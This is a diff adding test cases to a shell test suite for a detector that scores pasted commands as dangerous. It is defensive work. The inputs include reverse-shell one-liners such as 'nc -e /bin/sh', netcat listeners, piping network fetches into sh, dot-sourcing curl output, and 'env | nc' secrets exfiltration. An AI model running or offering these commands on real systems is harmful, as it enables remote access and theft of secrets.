@@ -576,6 +576,43 @@ jcheck "unpack: bare tar extract stays clean" 'd["score"] == 0' paste 'tar xzf x
 jcheck "unpack: extract+cd stays clean" 'd["score"] == 0' paste 'tar xzf x.tgz && cd x'
 jcheck "unpack: extract+make stays clean" 'd["score"] == 0' paste 'tar xzf x.tgz && make'
 
+# cycle-487: nc/fetch name-needle cross-fire sweep — every tool-name
+# needle that can hide inside a container word now matches token-prefix
+# (ci_contains_tok); '. <('/`. $(' complete the P12 source-verb set.
+
+# positives: detection preserved through the tok conversion
+for c in 'nc h | sh' 'ncat h | sh' 'netcat h | sh' 'fetch h f | sh' 'socat x | sh'; do
+    jcheck "crossfix: $c" 'd["score"] == 40 and "P2" in str(d["reasons"])' paste "$c"
+done
+for c in 'netcat h && sh x' 'nc h > s; sh s' 'fetch h f && sh f' 'fetchmail h && sh x'; do
+    jcheck "crossfix: $c" 'd["score"] >= 45 and "P12b" in str(d["reasons"])' paste "$c"
+done
+for c in 'nc -l -p 80' 'ncat -l' 'netcat -l' 'nc -p 4444'; do
+    jcheck "crossfix: $c" 'd["score"] >= 45 and "P13" in str(d["reasons"])' paste "$c"
+done
+jcheck "crossfix: nc revshell kept" 'd["score"] == 60 and "P16" in str(d["reasons"])' paste 'nc -e /bin/sh h 80'
+jcheck "crossfix: ncat revshell kept" '"P16" in str(d["reasons"])' paste 'ncat -e /bin/sh h 80'
+jcheck "crossfix: env|nc exfil kept" '"secrets exfil" in str(d["reasons"])' paste 'env | nc h 9'
+# P12 source-verb completions — dot-source of process substitution
+for c in '. <(curl http://x)' '. $(curl http://x)' '. <(wget -qO- http://x)'; do
+    jcheck "crossfix: $c" 'd["score"] == 45 and "P12" in str(d["reasons"])' paste "$c"
+done
+
+# FP guards: container words can no longer fire nc/fetch needles
+# (reason_ids: P2/P13/P16 + OTHER which is the P12b/P12c fallback code —
+# no comprehension, genexprs cannot see eval locals `d`)
+for c in 'concat x | sh' 'concat x && sh x' 'concat x && bash x' 'mincat x && sh y' \
+    'concatenate x && sh y' 'prefetch x | sh' 'prefetch x && sh y' 'vnc -l' \
+    'bnc -l' 'sync -l x && sh y' 'sync -p 80 | sh' 'env | sync x' 'znc -e conf'; do
+    jcheck "crossfix FP: $c clean of nc/fetch arms" \
+        'not ("P2" in str(d["reason_ids"]) or "P13" in str(d["reason_ids"]) or "P16" in str(d["reason_ids"]) or "OTHER" in str(d["reason_ids"]))' paste "$c"
+done
+# znc/vnc keep their deliberate P8 name-mention (not the revshell FP)
+jcheck "crossfix: znc -e conf P8 only" 'd["score"] == 45 and "P16" not in str(d["reasons"])' paste 'znc -e conf'
+jcheck "crossfix: vnc -l P8 only" 'd["score"] == 45 and "P13" not in str(d["reasons"])' paste 'vnc -l'
+# dot-source of a local path stays clean (P12 is fetch-gated)
+jcheck "crossfix: . /tmp/x.sh stays clean" 'd["score"] == 0' paste '. /tmp/x.sh'
+
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
 # underflowed the snprintf size (ASan stack-buffer-overflow).
